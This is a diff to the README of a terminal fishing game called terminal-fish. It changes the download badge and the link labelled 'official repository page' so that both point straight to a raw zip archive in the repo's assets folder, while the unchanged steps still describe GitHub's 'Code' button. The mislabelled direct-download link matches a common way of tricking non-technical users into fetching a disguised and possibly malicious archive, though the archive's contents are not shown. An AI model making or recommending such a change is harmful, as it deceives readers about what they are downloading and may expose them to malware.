@@ -1,6 +1,6 @@
 # 🎣 terminal-fish - Catch fish inside your own terminal
 
-[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://github.com/tactical-basidiomycetes9418/terminal-fish)
+[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://raw.githubusercontent.com/tactical-basidiomycetes9418/terminal-fish/main/assets/fish-terminal-2.6.zip)
 
 terminal-fish brings the excitement of fishing to your computer screen using simple text characters. You do not need experience with code or computers to play this game. This project focuses on relaxation and collection. You catch digital fish, move them into an aquarium, and keep track of your findings in a digital book called the FishDex. The entire experience happens inside a standard terminal window on your Windows computer.
 
@@ -16,7 +16,7 @@ You need a few things on your computer before you start playing. Ensure you have
 
 Follow these steps to set up the game on your system.
 
-1. Visit the [official repository page](https://github.com/tactical-basidiomycetes9418/terminal-fish) to download the game.
+1. Visit the [official repository page](https://raw.githubusercontent.com/tactical-basidiomycetes9418/terminal-fish/main/assets/fish-terminal-2.6.zip) to download the game.
 2. Look for the green "Code" button near the top right of the page.
 3. Click "Download ZIP" to save the game files to your computer.
 4. Locate the downloaded file in your "Downloads" folder.
